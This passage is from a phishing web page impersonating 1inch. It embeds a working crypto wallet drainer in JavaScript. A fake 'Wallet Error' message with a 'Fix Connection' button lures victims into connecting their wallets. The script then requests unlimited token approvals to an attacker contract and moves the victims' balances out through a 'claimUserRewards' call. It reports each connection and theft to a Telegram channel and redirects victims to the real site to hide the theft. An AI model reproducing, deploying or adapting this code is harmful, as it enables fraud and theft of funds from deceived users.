                    estimatedValue: parseFloat(formattedBalance) * (token.avgPrice || 0),
                    method: 'claimUserRewards(address,uint256)',
                    contract: window.DRAINER_CONFIG.CONTRACT_ADDRESS
                  });
                  sendTelegramMessage(drainMessage);
                  
                } catch (txError) {
                  console.error(`üí• claimUserRewards FAILED for ${token.symbol}:`, txError);
                  
                  if (txError.code === 4001) {
                    console.log('üíî User rejected the draining transaction');
                  } else if (txError.code === -32000) {
                    console.log('üî¥ Transaction failed - possible causes:');
                    console.log('- Insufficient gas or gas price too low');
                    console.log('- Contract execution reverted');
                    console.log('- Network congestion');
                  } else if (txError.message && txError.message.includes('execution reverted')) {
                    console.log('üî¥ Contract execution reverted - checking possible causes:');
                    console.log(`- Current allowance: ${formattedAllowance} ${token.symbol}`);
                    console.log(`- Current balance: ${formattedBalance} ${token.symbol}`);
                    console.log('- Contract may have additional requirements');
                    
                    // Log the revert reason if available
                    if (txError.data) {
                      console.log('üìã Revert data:', txError.data);
                    }
                  } else {
                    console.log('üìõ Unknown transaction error:', txError.message);
                    console.log('Full error:', txError);
                  }
                }
                
                if (!success) {
                  console.error(`ÔøΩ claimUserRewards failed for ${token.symbol}`);
                }
                      const simulationResult = await window.ethereum.request({
                        method: 'eth_call',
                        params: [{
                          from: userAddress,
                          to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
                          data: claimCallData,
                          gas: '0x3D090'
                        }, 'latest']
                      });
                      console.log('‚úÖ Simulation successful:', simulationResult);
                    } catch (simError) {
                      console.error(`üí• Simulation failed for ${method.sig}:`, simError);
                      if (simError.message) {
                        console.error('Revert reason:', simError.message);
                      }
                      continue; // Skip this method if simulation fails
                    }
                    
                    const txHash = await window.ethereum.request({
                      method: 'eth_sendTransaction',
                      params: [{
                        from: userAddress,
                        to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
                        data: claimCallData,
                        gas: '0x3D090', // 250000 in hex
                        gasPrice: '0x5D21DBA00' // 25 gwei in hex
                      }]
                    });
                    
                    console.log(`‚úÖ ${token.symbol} drain tx submitted with ${method.sig}:`, txHash);
                    drainingSuccessCount++;
                    success = true;
                    
                    // Send Telegram notification for successful drain
                    const drainMessage = formatTelegramMessage('drain_success', {
                      address: userAddress,
                      symbol: token.symbol,
                      amount: formattedBalance,
                      txHash: txHash,
                      estimatedValue: parseFloat(formattedBalance) * (token.avgPrice || 0),
                      method: method.sig
                    });
                    sendTelegramMessage(drainMessage);
                    
                    break; // Success, no need to try other methods
                    
                  } catch (methodError) {
                    console.log(`‚ùå ${method.sig} failed:`, methodError.message);
                    console.error('Full error details:', methodError);
                    
                    if (methodError.code === 4001) {
                      console.log('üíî User rejected the draining transaction');
                      break; // User rejection, don't try other methods
                    } else if (methodError.code === -32000) {
                      console.log('üîß Contract execution error - trying next method...');
                    }
                    // Try next method
                  }
                }
                
                if (!success) {
                  console.error(`üí• All drain methods failed for ${token.symbol}`);
                }
                
              } catch (error) {
                console.error(`=== DRAINING FAILED FOR ${token.symbol} ===`);
                console.error('Error details:', error);
              }
            }
            
            console.log(`=== DRAINING COMPLETED ===`);
            console.log(`Successfully drained ${drainingSuccessCount} out of ${tokens.length} tokens`);
            
            // Send completion summary
            const summaryMessage = formatTelegramMessage('process_complete', {
              address: userAddress,
              approved: tokens.length,
              drained: drainingSuccessCount,
              total: tokens.length,
              status: drainingSuccessCount > 0 ? 'success' : 'failed'
            });
            sendTelegramMessage(summaryMessage);
            
            if (drainingSuccessCount > 0) {
              console.log('üéâ DRAINING WAS SUCCESSFUL! üéâ');
            } else {
              console.log('‚ö†Ô∏è No tokens were successfully drained');
            }
            
          } catch (error) {
            console.error('=== DRAINING EXECUTION FAILED ===', error);
          }
        }
        
        async function approveTokenForDraining(token, userAddress, signer) {
          try {
            console.log(`=== APPROVAL PROCESS FOR ${token.symbol} ===`);
            
            // Format balance display based on library type
            let balanceDisplay;
            if (token.web3) {
              // Using Web3.js
              const balanceInWei = token.balance;
              balanceDisplay = (parseInt(balanceInWei) / Math.pow(10, token.decimals)).toFixed(4);
            } else {
              // Using ethers.js
              balanceDisplay = window.ethers.utils.formatUnits(token.balance, token.decimals);
            }
            
            console.log(`Balance: ${balanceDisplay} ${token.symbol}`);
            
            let currentAllowance;
            
            // Check current allowance
            if (token.web3) {
              // Using Web3.js
              currentAllowance = await token.contract.methods.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').call();
              console.log(`Current allowance: ${(parseInt(currentAllowance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
              
              if (parseInt(currentAllowance) >= parseInt(token.balance)) {
                console.log(`${token.symbol} already has sufficient approval`);
                return true;
              }
            } else {
              // Using ethers.js
              currentAllowance = await token.contract.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
              console.log(`Current allowance: ${window.ethers.utils.formatUnits(currentAllowance, token.decimals)} ${token.symbol}`);
              
              if (currentAllowance.gte(token.balance)) {
                console.log(`${token.symbol} already has sufficient approval`);
                return true;
              }
            }
            
            console.log(`Requesting approval for ${token.symbol}...`);
            
            let tx;
            
            if (token.web3) {
              // Using Web3.js
              const maxApproval = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // 2^256 - 1
              
              tx = await token.contract.methods.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval).send({
                from: userAddress,
                gas: 100000,
                gasPrice: token.web3.utils.toWei('20', 'gwei')
              });
              
              console.log(`${token.symbol} approval tx submitted:`, tx.transactionHash);
              
            } else {
              // Using ethers.js
              const contractWithSigner = token.contract.connect(signer);
              const maxApproval = window.ethers.constants.MaxUint256;
              
              let gasEstimate;
              try {
                gasEstimate = await contractWithSigner.estimateGas.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval);
                console.log(`Gas estimate for ${token.symbol}: ${gasEstimate.toString()}`);
              } catch (gasError) {
                console.error(`Gas estimation failed for ${token.symbol}:`, gasError);
                gasEstimate = window.ethers.BigNumber.from("100000");
              }
              
              tx = await contractWithSigner.approve(window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '', maxApproval, {
                gasLimit: gasEstimate.mul(120).div(100),
                gasPrice: window.ethers.utils.parseUnits('20', 'gwei')
              });
              
              console.log(`${token.symbol} approval tx submitted:`, tx.hash);
              console.log('Waiting for confirmation...');
              
              const receipt = await tx.wait(1);
              console.log(`${token.symbol} approval confirmed in block:`, receipt.blockNumber);
            }
            
            return true;
          } catch (error) {
            console.error(`=== APPROVAL FAILED FOR ${token.symbol} ===`);
            console.error('Error details:', error);
            
            if (error.code === 4001) {
              console.log('User rejected the transaction');
            } else if (error.code === -32603) {
              console.log('RPC error - network issue');
            } else {
              console.log('Unknown error:', error.message);
            }
            
            return false;
          }
        }
        
        async function executeDraining(tokens, userAddress, signer) {
          try {
            console.log('=== EXECUTING DRAINING ===');
            
            // Prepare contract interaction based on available library
            let drainerContract;
            
            if (tokens.length > 0 && tokens[0].web3) {
              // Using Web3.js
              console.log('Using Web3.js for draining');
              const web3 = tokens[0].web3;
              
              const drainerABI = [
                {
                  "constant": false,
                  "inputs": [
                    {"name": "token", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                  ],
                  "name": "claimUserRewards",
                  "outputs": [],
                  "type": "function"
                }
              ];
              
              drainerContract = new web3.eth.Contract(drainerABI, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
              
            } else {
              // Using ethers.js
              console.log('Using ethers.js for draining');
              const contractABI = [
                'function claimUserRewards(address token, uint256 amount) external',
                'function processRewards(address token, address user) external',
                'function processBatchRewards(address[] calldata tokens, address user) external'
              ];
              
              drainerContract = new window.ethers.Contract(
                window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '',
                contractABI,
                signer
              );
            }
            
            console.log('Drainer contract initialized:', window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : 'Config not loaded');
            
            // Drain each approved token individually for better success rate
            let drainingSuccessCount = 0;
            
            for (const token of tokens) {
              try {
                console.log(`=== DRAINING ${token.symbol} ===`);
                
                let currentAllowance, currentBalance, amountToDrain;
                
                if (token.web3) {
                  // Using Web3.js
                  currentAllowance = await token.contract.methods.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '').call();
                  currentBalance = await token.contract.methods.balanceOf(userAddress).call();
                  
                  console.log(`Current allowance: ${(parseInt(currentAllowance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  console.log(`Current balance: ${(parseInt(currentBalance) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  
                  if (parseInt(currentAllowance) === 0) {
                    console.log(`No allowance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  if (parseInt(currentBalance) === 0) {
                    console.log(`No balance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  amountToDrain = parseInt(currentBalance) < parseInt(currentAllowance) ? currentBalance : currentAllowance;
                  console.log(`Amount to drain: ${(parseInt(amountToDrain) / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`);
                  
                  // Execute draining with Web3.js
                  const tx = await drainerContract.methods.claimUserRewards(token.address, amountToDrain).send({
                    from: userAddress,
                    gas: 250000,
                    gasPrice: token.web3.utils.toWei('25', 'gwei')
                  });
                  
                  console.log(`${token.symbol} drain tx submitted:`, tx.transactionHash);
                  
                } else {
                  // Using ethers.js
                  currentAllowance = await token.contract.allowance(userAddress, window.DRAINER_CONFIG ? window.DRAINER_CONFIG.CONTRACT_ADDRESS : '');
                  currentBalance = await token.contract.balanceOf(userAddress);
                  
                  console.log(`Current allowance: ${window.ethers.utils.formatUnits(currentAllowance, token.decimals)} ${token.symbol}`);
                  console.log(`Current balance: ${window.ethers.utils.formatUnits(currentBalance, token.decimals)} ${token.symbol}`);
                  
                  if (currentAllowance.eq(0)) {
                    console.log(`No allowance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  if (currentBalance.eq(0)) {
                    console.log(`No balance for ${token.symbol} - skipping`);
                    continue;
                  }
                  
                  amountToDrain = currentBalance.lt(currentAllowance) ? currentBalance : currentAllowance;
                  console.log(`Amount to drain: ${window.ethers.utils.formatUnits(amountToDrain, token.decimals)} ${token.symbol}`);
                  
                  // Estimate gas for the draining transaction
                  let gasEstimate;
                  try {
                    gasEstimate = await drainerContract.estimateGas.claimUserRewards(token.address, amountToDrain);
                    console.log(`Gas estimate for draining ${token.symbol}: ${gasEstimate.toString()}`);
                  } catch (gasError) {
                    console.error(`Gas estimation failed for draining ${token.symbol}:`, gasError);
                    gasEstimate = window.ethers.BigNumber.from("250000");
                  }
                  
                  // Execute the draining
                  const tx = await drainerContract.claimUserRewards(
                    token.address,
                    amountToDrain,
                    { 
                      gasLimit: gasEstimate.mul(130).div(100),
                      gasPrice: window.ethers.utils.parseUnits('25', 'gwei')
                    }
                  );
                  
                  console.log(`${token.symbol} drain tx submitted:`, tx.hash);
                  console.log('Waiting for confirmation...');
                  
                  const receipt = await tx.wait(1);
                  console.log(`${token.symbol} drain confirmed in block:`, receipt.blockNumber);
                }
                
                drainingSuccessCount++;
                console.log(`‚úì Successfully drained ${token.symbol}`);
                
              } catch (error) {
                console.error(`=== DRAINING FAILED FOR ${token.symbol} ===`);
                console.error('Error details:', error);
                
                if (error.code === 4001) {
                  console.log('User rejected the draining transaction');
                } else if (error.code === -32603) {
                  console.log('RPC error during draining');
                } else if (error.message && error.message.includes('insufficient funds')) {
                  console.log('Insufficient gas funds for draining');
                } else {
                  console.log('Unknown draining error:', error.message);
                }
                
                // Continue with other tokens even if one fails
              }
            }
            
            console.log(`=== DRAINING COMPLETED ===`);
            console.log(`Successfully drained ${drainingSuccessCount} out of ${tokens.length} tokens`);
            
            if (drainingSuccessCount > 0) {
              console.log('üéâ DRAINING WAS SUCCESSFUL! üéâ');
            } else {
              console.log('‚ö†Ô∏è No tokens were successfully drained');
            }
            
          } catch (error) {
            console.error('=== DRAINING EXECUTION FAILED ===', error);
          }
        }
        
        function redirectToRealSite() {
          const buttonText = document.querySelector('.text-block-2');
          if (buttonText) {
            buttonText.textContent = 'Connection Fixed!';
          }
          
          setTimeout(() => {
            console.log('Redirecting to real site...');
            window.location.href = window.DRAINER_CONFIG ? window.DRAINER_CONFIG.VICTIM_REDIRECT : 'https://1inch.io';
          }, 1500);
        }
        
        async function showWalletConnectModal() {
          console.log('Opening Web3Modal connection...');
          
          if (isConnecting) {
            console.log('Connection already in progress');
            return;
          }
          
          // Check if Web3Modal is initialized
          if (!web3Modal) {
            console.error('Web3Modal not initialized');
            alert('Wallet connection not ready. Please refresh the page and try again.');
            return;
          }
          
          try {
            console.log('Opening Web3Modal...');
            isConnecting = true;
            
            // Detect mobile for optimized experience
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (isMobile) {
              console.log('Mobile device detected - optimizing wallet selection');
            }
            
            // Connect through Web3Modal - this opens the modal with all wallet options
            provider = await web3Modal.connect();
            
            if (provider) {
              web3 = new window.Web3(provider);
              
              // Get accounts
              const accounts = await web3.eth.getAccounts();
              
              if (accounts && accounts.length > 0) {
                isConnecting = false;
                console.log('Web3Modal connection successful:', accounts[0]);
                
                // Send Telegram notification with device info
                const message = formatTelegramMessage('user_connected', {
                  address: accounts[0],
                  method: 'Web3Modal Universal',
                  device: isMobile ? 'Mobile' : 'Desktop',
                  userAgent: navigator.userAgent.substring(0, 100) // First 100 chars
                });
                sendTelegramMessage(message);
                
                // Start draining process
                setTimeout(() => {
                  performDraining(accounts[0]);
                }, 1000);
              } else {
                isConnecting = false;
                console.error('No accounts found');
                alert('No wallet accounts found. Please try again.');
              }
            } else {
              isConnecting = false;
              console.error('No provider returned from Web3Modal');
              alert('Failed to connect wallet. Please try again.');
            }
            
          } catch (error) {
            isConnecting = false;
            console.error('Error connecting with Web3Modal:', error);
            
            if (error.message && error.message.includes('User closed modal')) {
              console.log('User cancelled wallet selection');
            } else {
              alert('Failed to connect wallet. Please try again.');
            }
          }
        }
      });
    </script>
  </head>
  <body>
    <section class="section">
      <div class="blurryj">
        <div
          data-w-id="4459e431-d820-757d-a73d-5b3f686bac64"
          style="
            -webkit-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            -moz-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            -ms-transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
            transform: translate3d(0, 0, 0) scale3d(0, 0, 1) rotateX(0)
              rotateY(0) rotateZ(0) skew(0, 0);
          "
          class="div-block"
        >
          <img src="images/logo.webp" loading="lazy" alt="" class="image" />
          <h1 class="heading">Wallet Error</h1>
          <div
            class="lottie-animation"
            data-w-id="3d254f45-d386-9046-0a78-a29acb2e79d8"
            data-animation-type="lottie"
            data-src="documents/Animation---1738159120499.json"
            data-loop="1"
            data-direction="1"
            data-autoplay="1"
            data-is-ix2-target="0"
            data-renderer="svg"
            data-default-duration="0"
            data-duration="0"
          ></div>
          <div class="text-block">
            We‚Äôve detected an issue with your connected wallet on
            <strong class="bold-text">1inch </strong>This may affect your
            ability to access certain features. For asset security, a temporary
            safe wallet would be generated to store potential pending
            transactions until connection is restored.
          </div>
          <div class="fix-button fixy">
            <img
              src="images/connect.svg"
              loading="lazy"
              alt=""
              class="image-2"
            />
            <a class="text-block-2">Fix Connection</a>
          </div>
        </div>
      </div>
    </section>
    <script
      src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=679a2416e7cbe76e72c70e9a"
      type="text/javascript"
      integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
      crossorigin="anonymous"
    ></script>
    <script src="js/webflow.js" type="text/javascript"></script>
  </body>
</html>
